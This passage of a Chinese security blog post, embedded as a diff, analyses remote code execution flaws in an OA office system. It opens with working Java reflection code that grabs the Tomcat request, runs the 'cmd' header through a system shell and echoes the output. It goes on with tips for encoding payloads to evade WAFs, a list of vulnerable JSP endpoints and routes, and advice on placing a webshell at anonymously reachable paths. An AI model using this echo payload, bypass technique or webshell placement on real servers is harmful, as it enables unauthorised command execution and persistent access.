+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">str</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">str</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;http&#34;</span><span class="o">))</span> <span class="k">continue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;target&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">t</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(!(</span><span class="n">obj</span> <span class="k">instanceof</span> <span class="n">Runnable</span><span class="o">))</span> <span class="k">continue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;this$0&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">obj</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">f</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;handler&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">f</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;handler&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">obj</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">f</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;global&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">f</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;global&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">obj</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;processors&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">List</span> <span class="n">processors</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">List</span><span class="o">)(</span><span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">obj</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">processors</span><span class="o">.</span><span class="na">size</span><span class="o">();</span> <span class="o">++</span><span class="n">j</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Object</span> <span class="n">processor</span> <span class="o">=</span> <span class="n">processors</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">j</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">f</span> <span class="o">=</span> <span class="n">processor</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;req&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Object</span> <span class="n">req</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">processor</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Object</span> <span class="n">resp</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getResponse&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]).</span><span class="na">invoke</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">str</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">req</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getHeader&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">}).</span><span class="na">invoke</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;cmd&#34;</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">str</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">str</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">resp</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;setStatus&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">}).</span><span class="na">invoke</span><span class="o">(</span><span class="n">resp</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="k">new</span> <span class="n">Integer</span><span class="o">(</span><span class="n">200</span><span class="o">)});</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;window&#34;</span><span class="o">)</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">str</span><span class="o">}</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">str</span><span class="o">};</span>
+</span></span><span class="line"><span class="cl">                    <span class="kt">byte</span><span class="o">[]</span> <span class="n">result</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">((</span><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="n">cmds</span><span class="o">)).</span><span class="na">start</span><span class="o">().</span><span class="na">getInputStream</span><span class="o">())).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">).</span><span class="na">next</span><span class="o">().</span><span class="na">getBytes</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.tomcat.util.buf.ByteChunk&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">obj</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">cls</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;setBytes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">}).</span><span class="na">invoke</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">result</span><span class="o">,</span> <span class="k">new</span> <span class="n">Integer</span><span class="o">(</span><span class="n">0</span><span class="o">),</span> <span class="k">new</span> <span class="n">Integer</span><span class="o">(</span><span class="n">result</span><span class="o">.</span><span class="na">length</span><span class="o">)});</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">resp</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;doWrite&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">cls</span><span class="o">}).</span><span class="na">invoke</span><span class="o">(</span><span class="n">resp</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">obj</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchMethodException</span> <span class="n">var5</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.nio.ByteBuffer&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">obj</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;wrap&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">}).</span><span class="na">invoke</span><span class="o">(</span><span class="n">cls</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">result</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">resp</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;doWrite&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">cls</span><span class="o">}).</span><span class="na">invoke</span><span class="o">(</span><span class="n">resp</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">obj</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">flag</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">flag</span><span class="o">)</span>  <span class="k">break</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p><strong>payload过长&amp;特殊字符</strong></p>
+<p><code>payload</code> 过长主要体现在两方面，代码执行和写文件。对于代码执行的话，我们需要缩短通用回显的一些不必要操作，如空格、换行，异常处理，执行部分不必对系统类型进行判断（通过前面任意文件读取来判断）。写文件过长则需要进行分段追加写入，调整一下参数即可。如</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">new</span> <span class="n">FileWriter</span><span class="o">(</span><span class="s">&#34;./test.txt&#34;</span><span class="o">,</span><span class="kc">true</span><span class="o">);</span>
+</span></span></code></pre></div><p>对于特殊字符，命令执行和文件写入都会涉及。比如我们payload传输为</p>
+<pre tabindex="0"><code>/?shellcode=boolean flag = false;ThreadGroup group =Thread.currentThread().getThreadGroup();.....
+</code></pre><p>这样很容易造成参数不解析，这里推荐使用 <code>unicode</code> 编码执行代码部分，了解java都知道unicode的重要性，其对一些 <code>waf</code> 也具有免杀效果。</p>
+<p>demo</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/01/01/MCwrh96apyBeIuF.png"
+    data-srcset="https://s2.loli.net/2023/01/01/MCwrh96apyBeIuF.png, https://s2.loli.net/2023/01/01/MCwrh96apyBeIuF.png 1.5x, https://s2.loli.net/2023/01/01/MCwrh96apyBeIuF.png 2x"
+    data-sizes="auto"
+    alt="image-20221231232055011"
+    title="image-20221231232055011"/></p>
+<p>注意编码执行命令的 <code>script</code> 参数。</p>
+<h2 id="漏洞扩展">漏洞扩展</h2>
+<p>回到前面的漏洞分析，主要触发在于 <code>getDataList(requestInfo)</code> 。通过全局搜索</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/01/01/a3OmNvGRXW1Blwc.png"
+    data-srcset="https://s2.loli.net/2023/01/01/a3OmNvGRXW1Blwc.png, https://s2.loli.net/2023/01/01/a3OmNvGRXW1Blwc.png 1.5x, https://s2.loli.net/2023/01/01/a3OmNvGRXW1Blwc.png 2x"
+    data-sizes="auto"
+    alt="image-20221231233048765"
+    title="image-20221231233048765"/></p>
+<p>通过对9个文件进行逐一确定，最终发现以下文件用法基本相同</p>
+<pre tabindex="0"><code>/km/summary/km_summary_main/datajson.jsp
+/sys/common/datajson.jsp
+/sys/common/treejson.jsp
+/sys/common/treexml.jsp
+/tic/core/resource/js/erp_data.jsp
+</code></pre><p>后续对比 @珂技 师傅文章，发现基本一致，只缺少了 <code>/km/summary/km_summary_main/datajson.jsp</code></p>
+<p>对于 <code>kmss_core.jar</code> 部分</p>
+<p><code>com/landray/kmss/common/actions/DataController.class</code></p>
+<p>同样存在类似触发点</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/01/01/2gCaKAmtRJ3TbpW.png"
+    data-srcset="https://s2.loli.net/2023/01/01/2gCaKAmtRJ3TbpW.png, https://s2.loli.net/2023/01/01/2gCaKAmtRJ3TbpW.png 1.5x, https://s2.loli.net/2023/01/01/2gCaKAmtRJ3TbpW.png 2x"
+    data-sizes="auto"
+    alt="image-20221231235305421"
+    title="image-20221231235305421"/></p>
+<p>包括</p>
+<pre tabindex="0"><code>/data/sys-common/dataxml
+/data/sys-common/treexml
+/data/sys-common/datajson
+</code></pre><p>不过这些路由，并不能通过前面文件包含来进行利用。（这点 @珂技 师傅文章未说明。且路由需要管理权限，正常无法利用。</p>
+<p>不过这是一个引子，今年hw之前，有人公布了一个POC</p>
+<p><a href="https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce</a></p>
+<p>其正是用的 <code>/data/sys-common/treexml</code> 这条，不过其利用了springmvc的静态资源越权。也就是一个后缀匹配规则问题。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/01/01/PGVS97hMuzAnlre.png"
+    data-srcset="https://s2.loli.net/2023/01/01/PGVS97hMuzAnlre.png, https://s2.loli.net/2023/01/01/PGVS97hMuzAnlre.png 1.5x, https://s2.loli.net/2023/01/01/PGVS97hMuzAnlre.png 2x"
+    data-sizes="auto"
+    alt="image-20230101000512743"
+    title="image-20230101000512743"/></p>
+<p>由于静态资源不用进行鉴权处理，所以可用。所以payload可随意扩展</p>
+<p>最后的 <code>tips</code> 是关于webshell写入的问题，由于蓝凌OA的spring安全限制，对匿名访问路径有控制，假如我们写入了 <code>/xxx.jsp</code> 后缀是无法更改的，所以不能通过 <code>springmvc</code> 绕过，我们可以查看匿名访问路径。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/01/01/OLPutr83FjaIJX6.png"
+    data-srcset="https://s2.loli.net/2023/01/01/OLPutr83FjaIJX6.png, https://s2.loli.net/2023/01/01/OLPutr83FjaIJX6.png 1.5x, https://s2.loli.net/2023/01/01/OLPutr83FjaIJX6.png 2x"
+    data-sizes="auto"
+    alt="image-20230101002008195"
+    title="image-20230101002008195"/></p>
+<p>在 <code>authenticationValidateCore</code> 中，遵守对应值即可匿名访问。如 <code>logoinx.jsp</code> 、<code>logoutx.jsp</code> 等。</p>
+<p>该文件同样位于<code>WEB-INF/KmssConfig/sys/authentication/spring.xml</code>。</p>
+<p>至于后续的1day及深入扩展，后面会写。</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2022-12-31&#32;23:59:59>更新于 2022-12-31&nbsp;</span>
+      </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/posts/%E8%93%9D%E5%87%8Coa%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-title="某OA简单分析" data-hashtags="Java,OA"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://example.org/posts/%E8%93%9D%E5%87%8Coa%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-hashtag="Java"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://example.org/posts/%E8%93%9D%E5%87%8Coa%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-title="某OA简单分析" data-image="https://s2.loli.net/2022/12/26/k5g8wTaVWdOU4i2.png"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/java/' class="post-tag">Java</a><a href='/tags/oa/' class="post-tag">OA</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/frp/" class="post-nav-item" rel="prev" title="frp浅改记录"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>frp浅改记录</a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.104.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright order-2" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中 ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">网站运行中 ...</span></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="right: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"typeit-header-subtitle-desktop":"web security | code review","typeit-header-subtitle-mobile":"web security | code review"},"enablePWA":true,"pangu":{"enable":true,"selector":"article"},"search":{"highlightTag":"em","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50},"siteTime":"2022-12-21T16:00:00+08:00","twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-subtitle-desktop":["typeit-header-subtitle-desktop"],"typeit-header-subtitle-mobile":["typeit-header-subtitle-mobile"]},"duration":-1,"speed":100}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
